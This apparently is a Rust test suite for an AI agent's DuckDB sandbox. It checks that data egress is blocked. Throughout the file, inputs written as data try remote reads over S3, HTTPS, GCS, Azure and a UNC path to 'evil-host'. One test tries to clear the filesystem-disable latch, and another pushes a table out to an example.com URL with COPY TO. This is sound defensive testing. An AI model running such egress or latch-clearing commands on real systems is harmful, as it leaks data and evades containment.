// crates/droplet-core/src/security/egress.rs
//! Network egress / data-plane reachability — adversarial angles. seam: `engine_duckdb.rs::new_in_memory` httpfs/S3 disable latch; remote paths & table functions.
#![allow(unused_imports)]
use monty::MontyObject;
use crate::DropletError;
use crate::session::Session;
use crate::engine_duckdb::{DuckEngine, Dataset, DEFAULT_MAX_RESULT_ROWS};
use crate::registry::Registry;
use crate::tool::{Tool, ToolCx};
use super::{dispatch, catch_dispatch, tmp_dir, sales_parquet, write_parquet, list_len};

/// `HOLDS` — s3:// as the path argument routed into read_parquet — the direct object-store reach via the registered path; S3FileSystem.
/// seam: tools.rs query -> engine_duckdb.rs register_parquet: s3:// as the path arg (CREATE VIEW over read_parquet)
#[test]
fn egress_s3_path_arg_blocked() {
    let mut s = Session::new("egress-s3-path").unwrap();
    let err = s.run_code("query('s3://nope/x.parquet', 'SELECT * FROM data')").unwrap_err();
    assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // Missing-Extension at register_parquet's CREATE VIEW; httpfs never auto-installs/loads -> no socket, no rows.
}

/// `HOLDS` — https:// scheme as path arg — distinct filesystem (HTTPFileSystem) from S3, exercises the TLS HTTP egress vector.
/// seam: tools.rs query -> register_parquet: https:// path arg (HTTPFileSystem)
#[test]
fn egress_https_path_arg_blocked() {
    let mut s = Session::new("egress-https-path").unwrap();
    let err = s.run_code("query('https://example.com/x.parquet', 'SELECT * FROM data')").unwrap_err();
    assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // HTTPFileSystem read needs httpfs which never loads -> Missing-Extension, no TLS connect.
}

/// `HOLDS` — Plaintext http:// (port 80) is a separate gadget from https:// — proves cleartext HTTP is equally dead, not just TLS.
/// seam: tools.rs query -> register_parquet: plaintext http:// path arg
#[test]
fn egress_http_plaintext_path_arg_blocked() {
    let mut s = Session::new("egress-http-path").unwrap();
    let err = s.run_code("query('http://example.com/x.parquet', 'SELECT * FROM data')").unwrap_err();
    assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // plaintext HTTP is the same HTTPFileSystem latch -> Missing-Extension, no port-80 connect.
}

/// `HOLDS` — GCS scheme — DuckDB routes gcs:// through httpfs. Distinct cloud vendor from s3/azure; confirms autoload latch covers GCS.
/// seam: tools.rs query -> register_parquet: gcs:// path arg (rides httpfs)
#[test]
fn egress_gcs_scheme_path_arg_blocked() {
    let mut s = Session::new("egress-gcs-path").unwrap();
    let err = s.run_code("query('gcs://bucket/x.parquet', 'SELECT * FROM data')").unwrap_err();
    assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // gcs:// rides httpfs -> Missing-Extension, no GCS round-trip.
}

/// `HOLDS` — Azure Blob uses a DIFFERENT extension ('azure') — proves autoinstall/autoload=false blocks the whole extension class, not just httpfs by name.
/// seam: tools.rs query -> register_parquet: azure:// path arg (separate 'azure' extension, not httpfs)
#[test]
fn egress_azure_scheme_path_arg_blocked() {
    let mut s = Session::new("egress-azure-path").unwrap();
    let err = s.run_code("query('azure://acct/x.parquet', 'SELECT * FROM data')").unwrap_err();
    assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // azure:// needs the 'azure' extension (NOT httpfs) which also never auto-loads -> Missing-Extension.
}

/// `HOLDS` — UNC \\host\share is the SMB/CIFS reach vector. Distinct from URL schemes: it is an IO 'no files' error (local glob), NOT a Missing-Extension error, proving DuckDB does not resolve it over the network.
/// seam: tools.rs query -> register_parquet: Windows UNC \\host\share path arg must reach DuckDB intact via raw Python literal
#[test]
fn egress_unc_path_arg_no_smb_reach() {
    let mut s = Session::new("egress-unc-path").unwrap();
    // raw Python string r'...' so backslashes survive Monty's parser and reach DuckDB as a UNC path
    let err = s.run_code(r#"query(r'\\evil-host\share\x.parquet', 'SELECT * FROM data')"#).unwrap_err();
    assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // DuckDB treats the UNC string as a LOCAL path glob ('No files found that match the pattern'), never an SMB/CIFS mount -> no egress.
}

/// `HOLDS` — file:// URI — a scheme that LOOKS remote but resolves locally. Distinct: confirms it never escalates to a network handler and the scheme prefix is not silently stripped into a host-file read.
/// seam: tools.rs query -> register_parquet: file:// URI path arg resolves locally, not as a remote handler
#[test]
fn egress_file_uri_scheme_treated_local() {
    let mut s = Session::new("egress-file-uri").unwrap();
    let err = s.run_code("query('file:///etc/hostname', 'SELECT * FROM data')").unwrap_err();
    assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // file:// is not a remote FS; DuckDB's local handler returns IO Error 'No files found' for the literal 'file://...' -> no egress, no parquet decoded.
}

/// `HOLDS` — Remote table fn embedded in the SQL BODY (not the path arg) over an otherwise-valid local dataset — the in-SQL egress vector, distinct from the path-arg family.
/// seam: engine_duckdb.rs local_sql (WITH data AS ...): remote read_csv() inside agent SQL over a valid local handle
#[test]
fn egress_read_csv_https_in_sql_blocked() {
    let dir = tmp_dir("egress-readcsv");
    let p = sales_parquet(&dir);
    let mut s = Session::new("egress-readcsv").unwrap();
    let err = s.run_code(&format!("query({p:?}, \"SELECT * FROM read_csv('https://example.com/a.csv')\")")).unwrap_err();
    let _ = std::fs::remove_dir_all(&dir);
    assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // path arg is a LEGITIMATE local parquet, but the SQL body reaches out via read_csv over https -> Missing-Extension at exec, no fetch.
}

/// `HOLDS` — read_json is a distinct table function (different reader/format) than read_csv/read_parquet; some egress filters key on function name — proves the block is filesystem-level, covering JSON too.
/// seam: engine_duckdb.rs local_sql: remote read_json() in agent SQL
#[test]
fn egress_read_json_https_in_sql_blocked() {
    let dir = tmp_dir("egress-readjson");
    let p = sales_parquet(&dir);
    let mut s = Session::new("egress-readjson").unwrap();
    let err = s.run_code(&format!("query({p:?}, \"SELECT * FROM read_json('https://example.com/a.json')\")")).unwrap_err();
    let _ = std::fs::remove_dir_all(&dir);
    assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // read_json over https is the same httpfs latch -> Missing-Extension, no egress.
}

/// `HOLDS` — read_blob reads raw bytes — the strongest generic remote-fetch primitive (not format-bound). Distinct gadget: if any reader could pull bytes off the network it would be this one.
/// seam: engine_duckdb.rs local_sql: remote read_blob() in agent SQL (raw-bytes remote-fetch primitive)
#[test]
fn egress_read_blob_https_in_sql_blocked() {
    let dir = tmp_dir("egress-readblob");
    let p = sales_parquet(&dir);
    let mut s = Session::new("egress-readblob").unwrap();
    let err = s.run_code(&format!("query({p:?}, \"SELECT * FROM read_blob('https://example.com/a.bin')\")")).unwrap_err();
    let _ = std::fs::remove_dir_all(&dir);
    assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // read_blob (arbitrary remote bytes) over https -> Missing-Extension, no fetch.
}

/// `HOLDS` — glob() is metadata/listing reconnaissance (enumerate a bucket) rather than a full read — a distinct egress capability (discovery) the filesystem latch must also kill.
/// seam: engine_duckdb.rs local_sql: glob() over s3:// in agent SQL (remote directory listing / recon)
#[test]
fn egress_glob_s3_in_sql_blocked() {
    let dir = tmp_dir("egress-glob");
    let p = sales_parquet(&dir);
    let mut s = Session::new("egress-glob").unwrap();
    let err = s.run_code(&format!("query({p:?}, \"SELECT * FROM glob('s3://nope/*.parquet')\")")).unwrap_err();
    let _ = std::fs::remove_dir_all(&dir);
    assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // remote glob (bucket listing) needs httpfs -> Missing-Extension, no LIST round-trip.
}

/// `HOLDS` — Targets the scalar_i64 seam specifically: it bypasses the CREATE VIEW wrapping (uses conn.query_row directly). Proves the egress latch is enforced by the engine CONFIG, not a side effect of the view-create wrapper that protects query()/local_sql(). The most important 'different seam' angle.
/// seam: engine_duckdb.rs scalar_i64: SELECT CAST(<expr>) ... via query_row, NO CREATE-VIEW wrap — remote read in the scalar expr
#[test]
fn egress_remote_subquery_in_scalar_expr_blocked() {
    let dir = tmp_dir("egress-scalar");
    let p = sales_parquet(&dir);
    let mut s = Session::new("egress-scalar").unwrap();
    let code = format!("ds = register({p:?})\nscalar(ds, \"(SELECT COUNT(*) FROM read_csv('https://example.com/a.csv'))\")");
    let err = s.run_code(&code).unwrap_err();
    let _ = std::fs::remove_dir_all(&dir);
    assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // scalar() runs via query_row WITHOUT the CREATE-VIEW wrap, yet the remote read still Missing-Extensions at exec -> egress blocked on the non-view code path too.
}

/// `HOLDS` — Attacks the V1b handle surface (filter_rows where_sql) not query()/local_sql. The predicate slot is a different injection point; the view is lazy so egress is only attempted at to_rows — confirms deferred materialization still blocks.
/// seam: engine_duckdb.rs filter_rows -> lazy view; remote read in a WHERE IN subquery, materialized at to_rows
#[test]
fn egress_remote_subquery_in_filter_where_blocked() {
    let dir = tmp_dir("egress-filter");
    let p = sales_parquet(&dir);
    let mut s = Session::new("egress-filter").unwrap();
    let code = format!("ds = register({p:?})\nf = filter_rows(ds, \"amt IN (SELECT * FROM read_parquet('s3://nope/y.parquet'))\")\nto_rows(f)");
    let err = s.run_code(&code).unwrap_err();
    let _ = std::fs::remove_dir_all(&dir);
    assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // a remote read smuggled into the WHERE predicate of the handle surface is still Missing-Extension at materialization (to_rows) -> no egress.
}

/// `HOLDS` — The prerequisite SETUP step of an egress chain (load/install the network extension), blocked structurally by the CREATE-VIEW wrap turning LOAD/INSTALL into parser errors. Distinct from the read-attempt angles — kills the setup, not the read.
/// seam: engine_duckdb.rs local_sql/new_view: CREATE VIEW dsN AS LOAD/INSTALL — non-SELECT prerequisite of an egress chain
#[test]
fn egress_load_httpfs_via_local_sql_is_parser_blocked() {
    // CORRECTED: a hard SQL/parser error inside local_sql CONSUMES the session REPL, so LOAD and
    // INSTALL must run on SEPARATE sessions — reusing one session makes the 2nd call return
    // DropletError::NotFound('session REPL consumed...'), NOT Duckdb, and the test would mis-fail.
    let mut s1 = Session::new("egress-load").unwrap();
    let err_load = s1.run_code("local_sql('LOAD httpfs', [])").unwrap_err();
    let mut s2 = Session::new("egress-install").unwrap();
    let err_install = s2.run_code("local_sql('INSTALL httpfs', [])").unwrap_err();
    assert!(matches!(err_load, DropletError::Duckdb(_)), "LOAD got {err_load:?}");
    assert!(matches!(err_install, DropletError::Duckdb(_)), "INSTALL got {err_install:?}"); // CREATE VIEW dsN AS LOAD/INSTALL is a Parser Error -> the agent cannot arm httpfs to begin an egress chain.
}

/// `HOLDS` — The deepest angle: even if an attacker somehow LOADs httpfs (which the agent surface cannot, but a future parser-wrap regression might allow), the disabled_filesystems Permission latch still blocks the read, and it is provably one-way. The second, independent defense layer.
/// seam: engine_duckdb.rs new_in_memory disabled_filesystems latch — white-box raw Connection mirroring the engine config
#[test]
fn egress_one_way_latch_blocks_s3_even_after_httpfs_loaded() {
    // White-box: reproduce the engine's exact hardening on a raw conn, FORCE-load httpfs
    // (the one thing the agent surface cannot do), then prove the disabled_filesystems latch
    // still blocks the read AND cannot be cleared.
    let conn = duckdb::Connection::open_in_memory().unwrap();
    conn.execute_batch(
        "SET autoinstall_known_extensions=false; \
         SET autoload_known_extensions=false; \
         SET disabled_filesystems='HTTPFileSystem,S3FileSystem';",
    ).unwrap();
    let _ = conn.execute_batch("INSTALL httpfs; LOAD httpfs;"); // succeeds: httpfs IS loadable
    let read = conn.execute_batch("CREATE VIEW v AS SELECT * FROM read_parquet('s3://nope/x.parquet')");
    let clear = conn.execute_batch("SET disabled_filesystems=''");
    let reset = conn.execute_batch("RESET disabled_filesystems");
    assert!(read.is_err(), "s3 read must be blocked even with httpfs loaded (Permission Error: File system S3FileSystem has been disabled by configuration)");
    assert!(clear.is_err(), "disabled_filesystems must not be clearable on a running db (one-way latch)");
    assert!(reset.is_err(), "disabled_filesystems must not be RESET-able on a running db (one-way latch)");
}

/// `HOLDS` — OUTBOUND (push) egress rather than inbound (pull) — COPY TO a remote URL is exfiltration via write. Distinct direction from every read-based angle; blocked at the parser by the view wrap before the httpfs latch even matters.
/// seam: engine_duckdb.rs local_sql/new_view: CREATE VIEW wrap turns COPY ... TO into a parser error (outbound PUSH egress)
#[test]
fn egress_copy_to_https_write_is_blocked() {
    let dir = tmp_dir("egress-copyout");
    let p = sales_parquet(&dir);
    let mut s = Session::new("egress-copyout").unwrap();
    let err = s.run_code(&format!("query({p:?}, \"COPY data TO 'https://example.com/out.parquet'\")")).unwrap_err();
    let _ = std::fs::remove_dir_all(&dir);
    assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}"); // COPY ... TO is a write/PUSH egress; CREATE VIEW dsN AS WITH data AS (...) COPY ... is a Parser Error -> the agent cannot PUSH data out over the network either.
}
